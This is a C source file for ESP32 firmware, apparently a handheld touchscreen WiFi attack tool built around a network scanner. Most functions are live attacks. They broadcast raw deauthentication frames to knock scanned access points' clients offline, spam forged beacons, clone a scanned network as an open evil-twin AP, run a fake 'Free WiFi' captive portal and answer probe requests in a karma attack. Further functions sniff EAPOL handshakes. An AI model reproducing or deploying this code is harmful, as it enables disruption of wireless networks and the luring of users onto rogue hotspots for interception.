#include "wifi_functions.h"
#include "packet_capture.h"
#include "sd_card.h"
#include "signal_visualizer.h"
#include "target_manager.h"
#include "attack_timer.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "display.h"
#include "touchscreen.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include <string.h>
#include <time.h>

static const char* TAG = "WIFI";
static bool wifi_initialized = false;
static wifi_ap_record_t ap_records[20];
static uint16_t ap_count = 0;
static uint32_t last_scan_time = 0;

esp_err_t wifi_init(void) {
    if (wifi_initialized) return ESP_OK;
    
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();
    
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    wifi_initialized = true;
    ESP_LOGI(TAG, "WiFi initialized");
    return ESP_OK;
}

void wifi_scan_start(void) {
    bool scanning = true;
    bool show_heatmap = false;
    int scroll_offset = 0;
    
    while (scanning) {
        display_fill_screen(COLOR_BLACK);
        display_draw_text(10, 10, "WiFi Scanner", COLOR_WHITE, COLOR_BLACK);
        display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
        display_draw_text(10, 30, "Scanning...", COLOR_GREEN, COLOR_BLACK);
        
        wifi_scan_config_t scan_config = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = true,
            .scan_type = WIFI_SCAN_TYPE_ACTIVE,
            .scan_time.active.min = 100,
            .scan_time.active.max = 300
        };
        
        esp_err_t ret = esp_wifi_scan_start(&scan_config, true);
        if (ret != ESP_OK) {
            display_draw_text(10, 50, "Scan failed!", COLOR_RED, COLOR_BLACK);
            ESP_LOGE(TAG, "Scan start failed: %s", esp_err_to_name(ret));
            vTaskDelay(pdMS_TO_TICKS(2000));
            continue;
        }
        
        ap_count = 20;
        ret = esp_wifi_scan_get_ap_records(&ap_count, ap_records);
        if (ret != ESP_OK) {
            display_draw_text(10, 50, "Get APs failed!", COLOR_RED, COLOR_BLACK);
            ESP_LOGE(TAG, "Get AP records failed: %s", esp_err_to_name(ret));
            vTaskDelay(pdMS_TO_TICKS(2000));
            continue;
        }
        
        last_scan_time = xTaskGetTickCount() / 1000;
        ESP_LOGI(TAG, "Found %d APs", ap_count);
        
        display_fill_rect(0, 50, 240, 200, COLOR_BLACK);
        
        uint32_t elapsed = (xTaskGetTickCount() / 1000) - last_scan_time;
        
        if (show_heatmap) {
            // Show channel heatmap
            draw_wifi_heatmap(ap_records, ap_count);
            char count_str[48];
            if (elapsed < 60) {
                snprintf(count_str, sizeof(count_str), "%d APs (%lus ago)", ap_count, elapsed);
            } else {
                snprintf(count_str, sizeof(count_str), "%d APs (%lum ago)", ap_count, elapsed / 60);
            }
            display_draw_text(10, 220, count_str, COLOR_GREEN, COLOR_BLACK);
        } else {
            // Show list with RSSI bars
            int items_per_page = 7;
            int start_idx = scroll_offset * items_per_page;
            int end_idx = start_idx + items_per_page;
            if (end_idx > ap_count) end_idx = ap_count;
            
            for (int i = start_idx; i < end_idx; i++) {
                int y = 50 + (i - start_idx) * 22;
                char ap_info[32];
                snprintf(ap_info, sizeof(ap_info), "%.20s", (char*)ap_records[i].ssid);
                display_draw_text(10, y, ap_info, COLOR_WHITE, COLOR_BLACK);
                
                // Draw RSSI bar
                draw_signal_meter(ap_records[i].rssi, 10, y + 10, 160, 8);
                
                // Save button
                display_fill_rect(175, y + 8, 50, 12, COLOR_GREEN);
                display_draw_text(185, y + 9, "SAVE", COLOR_WHITE, COLOR_GREEN);
            }
            
            // Page indicator
            int total_pages = (ap_count + items_per_page - 1) / items_per_page;
            char page_str[48];
            if (elapsed < 60) {
                snprintf(page_str, sizeof(page_str), "Page %d/%d - %d APs (%lus)", 
                        scroll_offset + 1, total_pages > 0 ? total_pages : 1, ap_count, elapsed);
            } else {
                snprintf(page_str, sizeof(page_str), "Page %d/%d - %d APs (%lum)", 
                        scroll_offset + 1, total_pages > 0 ? total_pages : 1, ap_count, elapsed / 60);
            }
            display_draw_text(10, 220, page_str, COLOR_BLUE, COLOR_BLACK);
        }
        
        // Draw main buttons
        display_fill_rect(10, 265, 60, 25, COLOR_BLUE);
        display_draw_text(20, 273, "SCAN", COLOR_WHITE, COLOR_BLUE);
        
        display_fill_rect(80, 265, 60, 25, COLOR_ORANGE);
        display_draw_text(85, 273, "VIEW", COLOR_WHITE, COLOR_ORANGE);
        
        display_fill_rect(150, 265, 70, 25, COLOR_RED);
        display_draw_text(165, 273, "BACK", COLOR_WHITE, COLOR_RED);
        
        // Scroll buttons for list view
        if (!show_heatmap) {
            int items_per_page = 7;
            int total_pages = (ap_count + items_per_page - 1) / items_per_page;
            if (scroll_offset > 0) {
                display_fill_rect(10, 238, 50, 22, COLOR_ORANGE);
                display_draw_text(18, 245, "PREV", COLOR_WHITE, COLOR_ORANGE);
            }
            if (scroll_offset < total_pages - 1) {
                display_fill_rect(170, 238, 50, 22, COLOR_ORANGE);
                display_draw_text(178, 245, "NEXT", COLOR_WHITE, COLOR_ORANGE);
            }
        }
        
        // Wait for button press
        while (true) {
            touch_point_t point = touchscreen_get_point();
            if (point.pressed) {
                // Check save buttons
                if (!show_heatmap && point.y >= 50 && point.y < 204) {
                    int items_per_page = 7;
                    int start_idx = scroll_offset * items_per_page;
                    int display_idx = (point.y - 50) / 22;
                    int ap_idx = start_idx + display_idx;
                    if (ap_idx < ap_count && point.x >= 175 && point.x <= 225) {
                        target_manager_quick_save_wifi(&ap_records[ap_idx]);
                        display_fill_rect(10, 205, 220, 15, COLOR_BLACK);
                        display_draw_text(10, 205, "Target saved!", COLOR_GREEN, COLOR_BLACK);
                        vTaskDelay(pdMS_TO_TICKS(1000));
                        break;
                    }
                }
                
                // Scroll buttons
                if (!show_heatmap && point.y >= 238 && point.y <= 260) {
                    int items_per_page = 7;
                    int total_pages = (ap_count + items_per_page - 1) / items_per_page;
                    if (point.x >= 10 && point.x <= 60 && scroll_offset > 0) {
                        scroll_offset--;
                        break;
                    } else if (point.x >= 170 && point.x <= 220 && scroll_offset < total_pages - 1) {
                        scroll_offset++;
                        break;
                    }
                }
                
                if (point.y >= 265 && point.y <= 290) {
                    if (point.x >= 10 && point.x <= 70) {
                        scroll_offset = 0;
                        break; // Rescan
                    } else if (point.x >= 80 && point.x <= 140) {
                        show_heatmap = !show_heatmap; // Toggle view
                        scroll_offset = 0;
                        break;
                    } else if (point.x >= 150 && point.x <= 220) {
                        scanning = false;
                        break; // Back
                    }
                }
            }
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        vTaskDelay(pdMS_TO_TICKS(300)); // Debounce
    }
}

void wifi_deauth_attack(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Deauth Attack", COLOR_RED, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    display_draw_text(10, 30, "Target all APs", COLOR_WHITE, COLOR_BLACK);
    
    attack_timer_start(60);
    esp_wifi_set_promiscuous(true);

uint8_t deauth_frame[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

int total_packets = 0;
for (int i = 0; i < 100 && !attack_timer_expired(); i++) {
    for (int j = 0; j < ap_count && j < 5; j++) {
        memcpy(&deauth_frame[10], ap_records[j].bssid, 6);
        memcpy(&deauth_frame[16], ap_records[j].bssid, 6);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        total_packets++;
    }
    
    if (i % 5 == 0) {
    char status[30];
    snprintf(status, sizeof(status), "Packets: %d", total_packets);
    display_fill_rect(10, 50, 200, 15, COLOR_BLACK);
    display_draw_text(10, 50, status, COLOR_RED, COLOR_BLACK);
    
    // This function already exists and draws the timer for you
    attack_timer_draw_overlay();
    }
        
        if (touchscreen_is_touched()) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_set_promiscuous(false);
    
    display_fill_rect(10, 100, 220, 40, COLOR_BLACK);
    display_draw_text(10, 100, "\xFB Attack Complete", COLOR_GREEN, COLOR_BLACK);
    
    char final[32];
    snprintf(final, sizeof(final), "Total: %d packets", total_packets);
    display_draw_text(10, 120, final, COLOR_WHITE, COLOR_BLACK);
    
    vTaskDelay(pdMS_TO_TICKS(2000));
}

void wifi_beacon_spam(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Beacon Spam", COLOR_RED, COLOR_BLACK);
    
    esp_wifi_set_promiscuous(true);
    
    const char* fake_ssids[] = {
        "Free WiFi", "Hotel Guest", "Airport WiFi", "Starbucks",
        "McDonald's", "FBI Surveillance", "NSA Listening Post"
    };
    
    uint8_t beacon_frame[] = {
        0x80, 0x00, 0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00,
        0x01, 0x04, 0x00, 0x06, 0x72, 0x72, 0x24, 0x24, 0x24, 0x24
    };
    
    for (int i = 0; i < 200; i++) {
        int ssid_idx = i % 7;
        int ssid_len = strlen(fake_ssids[ssid_idx]);
        
        beacon_frame[37] = ssid_len;
        memcpy(&beacon_frame[38], fake_ssids[ssid_idx], ssid_len);
        
        esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, 38 + ssid_len + 4, false);
        
        if (i % 10 == 0) {
            char status[30];
            snprintf(status, sizeof(status), "Beacons: %d", i);
            display_fill_rect(10, 30, 200, 15, COLOR_BLACK);
            display_draw_text(10, 30, status, COLOR_GREEN, COLOR_BLACK);
        }
        
        if (touchscreen_is_touched()) break;
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    esp_wifi_set_promiscuous(false);
    display_draw_text(10, 280, "Spam stopped", COLOR_GREEN, COLOR_BLACK);
}



void wifi_packet_monitor(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Packet Capture", COLOR_WHITE, COLOR_BLACK);
    display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
    
    // Check SD card
    if (!sd_card_is_mounted()) {
        display_draw_text(10, 40, "SD card not mounted!", COLOR_RED, COLOR_BLACK);
        display_draw_text(10, 60, "Insert SD card", COLOR_ORANGE, COLOR_BLACK);
        vTaskDelay(pdMS_TO_TICKS(3000));
        return;
    }
    
    // Generate filename with timestamp
    time_t now = time(NULL);
    struct tm timeinfo;
    localtime_r(&now, &timeinfo);
    char filename[32];
    snprintf(filename, sizeof(filename), "cap_%02d%02d_%02d%02d.pcap",
             timeinfo.tm_mon + 1, timeinfo.tm_mday,
             timeinfo.tm_hour, timeinfo.tm_min);
    
    display_draw_text(10, 40, "Starting capture...", COLOR_GREEN, COLOR_BLACK);
    display_draw_text(10, 60, filename, COLOR_BLUE, COLOR_BLACK);
    
    packet_capture_init();
    if (packet_capture_start(filename) != ESP_OK) {
        display_draw_text(10, 80, "Failed to start!", COLOR_RED, COLOR_BLACK);
        vTaskDelay(pdMS_TO_TICKS(3000));
        return;
    }
    
    esp_wifi_set_promiscuous_rx_cb(packet_capture_handler);
    esp_wifi_set_promiscuous(true);
    
    display_draw_text(10, 80, "Capturing packets...", COLOR_GREEN, COLOR_BLACK);
    display_draw_text(10, 280, "Touch to stop", COLOR_GRAY, COLOR_BLACK);
    
    // Live capture loop
    uint32_t last_count = 0;
    for (int i = 0; i < 600; i++) {
        uint32_t count = packet_capture_get_count();
        
        if (count != last_count) {
            char stats[32];
            snprintf(stats, sizeof(stats), "Packets: %lu", count);
            display_fill_rect(10, 100, 200, 20, COLOR_BLACK);
            display_draw_text(10, 100, stats, COLOR_GREEN, COLOR_BLACK);
            
            snprintf(stats, sizeof(stats), "Time: %ds", i / 10);
            display_fill_rect(10, 120, 200, 20, COLOR_BLACK);
            display_draw_text(10, 120, stats, COLOR_BLUE, COLOR_BLACK);
            
            // Draw simple bar graph
            int bar_width = (count % 200) * 220 / 200;
            display_fill_rect(10, 150, 220, 20, COLOR_BLACK);
            display_fill_rect(10, 150, bar_width, 20, COLOR_GREEN);
            
            last_count = count;
        }
        
        if (touchscreen_is_touched()) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    packet_capture_stop();
    
    display_fill_rect(10, 180, 220, 60, COLOR_BLACK);
    display_draw_text(10, 180, "Capture complete!", COLOR_GREEN, COLOR_BLACK);
    
    char final_stats[48];
    snprintf(final_stats, sizeof(final_stats), "Total: %lu packets", packet_capture_get_count());
    display_draw_text(10, 200, final_stats, COLOR_WHITE, COLOR_BLACK);
    
    snprintf(final_stats, sizeof(final_stats), "Saved: %.20s", filename);
    display_draw_text(10, 220, final_stats, COLOR_BLUE, COLOR_BLACK);
    
    vTaskDelay(pdMS_TO_TICKS(3000));
}

void wifi_evil_twin_attack(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Evil Twin AP", COLOR_RED, COLOR_BLACK);
    
    if (ap_count == 0) {
        display_draw_text(10, 30, "No targets found", COLOR_RED, COLOR_BLACK);
        display_draw_text(10, 50, "Run scan first", COLOR_WHITE, COLOR_BLACK);
        return;
    }
    
    wifi_config_t wifi_config = {
        .ap = {
            .ssid_len = strlen((char*)ap_records[0].ssid),
            .channel = ap_records[0].primary,
            .password = "",
            .max_connection = 4,
            .authmode = WIFI_AUTH_OPEN
        },
    };
    strcpy((char*)wifi_config.ap.ssid, (char*)ap_records[0].ssid);
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    char status[50];
    snprintf(status, sizeof(status), "AP: %s", wifi_config.ap.ssid);
    display_draw_text(10, 30, status, COLOR_GREEN, COLOR_BLACK);
    display_draw_text(10, 50, "Evil twin active", COLOR_RED, COLOR_BLACK);
    
    for (int i = 0; i < 300; i++) {
        if (touchscreen_is_touched()) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    display_draw_text(10, 280, "Evil twin stopped", COLOR_GREEN, COLOR_BLACK);
}

// Stub implementations for remaining functions
void wifi_deauth_detector(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Deauth Detector", COLOR_WHITE, COLOR_BLACK);
    display_draw_text(10, 30, "Monitoring deauth frames", COLOR_GREEN, COLOR_BLACK);
}

void wifi_captive_portal(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Captive Portal", COLOR_RED, COLOR_BLACK);
    display_draw_text(10, 30, "Creating fake hotspot", COLOR_WHITE, COLOR_BLACK);
    
    // Create fake WiFi hotspot
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = "Free WiFi",
            .ssid_len = strlen("Free WiFi"),
            .channel = 6,
            .password = "",
            .max_connection = 4,
            .authmode = WIFI_AUTH_OPEN
        },
    };
    
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
    esp_wifi_start();
    
    display_draw_text(10, 50, "AP: Free WiFi", COLOR_GREEN, COLOR_BLACK);
    display_draw_text(10, 70, "Portal running on 192.168.4.1", COLOR_WHITE, COLOR_BLACK);
    display_draw_text(10, 90, "Clients will be redirected", COLOR_ORANGE, COLOR_BLACK);
    
    // Simulate portal activity
    for (int i = 0; i < 300; i++) {
        char time_info[30];
        snprintf(time_info, sizeof(time_info), "Active: %ds", i / 10);
        display_fill_rect(10, 110, 200, 15, COLOR_BLACK);
        display_draw_text(10, 110, time_info, COLOR_GREEN, COLOR_BLACK);
        
        if (touchscreen_is_touched()) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    display_draw_text(10, 280, "Portal stopped", COLOR_GREEN, COLOR_BLACK);
}

void wifi_channel_analyzer(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Channel Analyzer", COLOR_WHITE, COLOR_BLACK);
    display_draw_text(10, 30, "Analyzing channels", COLOR_GREEN, COLOR_BLACK);
}

void wifi_pineapple_detector(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Pineapple Detector", COLOR_WHITE, COLOR_BLACK);
    display_draw_text(10, 30, "Scanning for rogue APs", COLOR_GREEN, COLOR_BLACK);
}

static void probe_packet_handler(void* buf, wifi_promiscuous_pkt_type_t type) {
    static int probe_count = 0;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    
    if (type == WIFI_PKT_MGMT && pkt->payload[0] == 0x40) { // Probe request
        probe_count++;
        
        if (probe_count % 10 == 0) {
            char status[30];
            snprintf(status, sizeof(status), "Probes: %d", probe_count);
            display_fill_rect(10, 50, 200, 15, COLOR_BLACK);
            display_draw_text(10, 50, status, COLOR_GREEN, COLOR_BLACK);
        }
    }
}

void wifi_probe_sniffer(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Probe Sniffer", COLOR_WHITE, COLOR_BLACK);
    display_draw_text(10, 30, "Capturing probe requests", COLOR_GREEN, COLOR_BLACK);
    
    esp_wifi_set_promiscuous_rx_cb(probe_packet_handler);
    esp_wifi_set_promiscuous(true);
    
    for (int i = 0; i < 300; i++) {
        char time_info[30];
        snprintf(time_info, sizeof(time_info), "Time: %ds/30s", i / 10);
        display_fill_rect(10, 70, 200, 15, COLOR_BLACK);
        display_draw_text(10, 70, time_info, COLOR_WHITE, COLOR_BLACK);
        
        if (touchscreen_is_touched()) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    display_draw_text(10, 280, "Probe sniffing stopped", COLOR_GREEN, COLOR_BLACK);
}

static void eapol_packet_handler(void* buf, wifi_promiscuous_pkt_type_t type) {
    static int eapol_count = 0;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    
    if (type == WIFI_PKT_DATA) {
        // Check for EAPOL packets (EtherType 0x888E)
        if (pkt->rx_ctrl.sig_len > 36) {
            uint8_t* payload = pkt->payload;
            if (payload[32] == 0x88 && payload[33] == 0x8E) {
                eapol_count++;
                
                char status[30];
                snprintf(status, sizeof(status), "EAPOL: %d", eapol_count);
                display_fill_rect(10, 50, 200, 15, COLOR_BLACK);
                display_draw_text(10, 50, status, COLOR_RED, COLOR_BLACK);
            }
        }
    }
}

void wifi_eapol_sniffer(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "EAPOL Sniffer", COLOR_WHITE, COLOR_BLACK);
    display_draw_text(10, 30, "Capturing handshakes", COLOR_GREEN, COLOR_BLACK);
    
    esp_wifi_set_promiscuous_rx_cb(eapol_packet_handler);
    esp_wifi_set_promiscuous(true);
    
    for (int i = 0; i < 600; i++) {
        char time_info[30];
        snprintf(time_info, sizeof(time_info), "Time: %ds/60s", i / 10);
        display_fill_rect(10, 70, 200, 15, COLOR_BLACK);
        display_draw_text(10, 70, time_info, COLOR_WHITE, COLOR_BLACK);
        
        if (touchscreen_is_touched()) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    display_draw_text(10, 280, "EAPOL sniffing stopped", COLOR_GREEN, COLOR_BLACK);
}

void wifi_wardriving_mode(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Wardriving Mode", COLOR_WHITE, COLOR_BLACK);
    display_draw_text(10, 30, "Logging WiFi networks", COLOR_GREEN, COLOR_BLACK);
}

static char karma_ssids[10][32];
static int karma_ssid_count = 0;

static void karma_packet_handler(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    
    if (type == WIFI_PKT_MGMT && pkt->payload[0] == 0x40) { // Probe request
        // Extract SSID from probe request
        uint8_t* payload = pkt->payload;
        if (payload[24] == 0x00 && payload[25] > 0 && payload[25] < 32) {
            int ssid_len = payload[25];
            char ssid[33] = {0};
            memcpy(ssid, &payload[26], ssid_len);
            
            // Add to karma list if not already present
            bool found = false;
            for (int i = 0; i < karma_ssid_count; i++) {
                if (strcmp(karma_ssids[i], ssid) == 0) {
                    found = true;
                    break;
                }
            }
            
            if (!found && karma_ssid_count < 10) {
                strcpy(karma_ssids[karma_ssid_count], ssid);
                karma_ssid_count++;
            }
        }
    }
}

void wifi_karma_attack(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Karma Attack", COLOR_RED, COLOR_BLACK);
    display_draw_text(10, 30, "Learning probe requests", COLOR_GREEN, COLOR_BLACK);
    
    karma_ssid_count = 0;
    
    // Phase 1: Learn SSIDs from probe requests
    esp_wifi_set_promiscuous_rx_cb(karma_packet_handler);
    esp_wifi_set_promiscuous(true);
    
    for (int i = 0; i < 100; i++) {
        char status[30];
        snprintf(status, sizeof(status), "SSIDs learned: %d", karma_ssid_count);
        display_fill_rect(10, 50, 200, 15, COLOR_BLACK);
        display_draw_text(10, 50, status, COLOR_GREEN, COLOR_BLACK);
        
        vTaskDelay(pdMS_TO_TICKS(100));
        if (touchscreen_is_touched()) break;
    }
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    
    // Phase 2: Create APs for learned SSIDs
    display_draw_text(10, 70, "Creating karma APs", COLOR_RED, COLOR_BLACK);
    
    for (int i = 0; i < karma_ssid_count; i++) {
        wifi_config_t wifi_config = {
            .ap = {
                .ssid_len = strlen(karma_ssids[i]),
                .channel = 1 + (i % 11),
                .password = "",
                .max_connection = 4,
                .authmode = WIFI_AUTH_OPEN
            },
        };
        strcpy((char*)wifi_config.ap.ssid, karma_ssids[i]);
        
        esp_wifi_set_mode(WIFI_MODE_AP);
        esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
        esp_wifi_start();
        
        char ap_info[50];
        snprintf(ap_info, sizeof(ap_info), "AP: %.30s", karma_ssids[i]);
        display_fill_rect(10, 90, 200, 15, COLOR_BLACK);
        display_draw_text(10, 90, ap_info, COLOR_RED, COLOR_BLACK);
        
        vTaskDelay(pdMS_TO_TICKS(2000));
        esp_wifi_stop();
        
        if (touchscreen_is_touched()) break;
    }
    
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    display_draw_text(10, 280, "Karma attack complete", COLOR_GREEN, COLOR_BLACK);
}

void wifi_pmkid_capture(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "PMKID Capture", COLOR_WHITE, COLOR_BLACK);
    display_draw_text(10, 30, "Capturing PMKIDs", COLOR_GREEN, COLOR_BLACK);
}

void wifi_rickroll_attack(void) {
    display_fill_screen(COLOR_BLACK);
    display_draw_text(10, 10, "Rickroll Attack", COLOR_RED, COLOR_BLACK);
    display_draw_text(10, 30, "Never gonna give you up!", COLOR_GREEN, COLOR_BLACK);
}

void wifi_evil_portal_attack(void) {
    wifi_evil_twin_attack();
}

void wifi_beacon_spam_enhanced(void) {
    wifi_beacon_spam();
}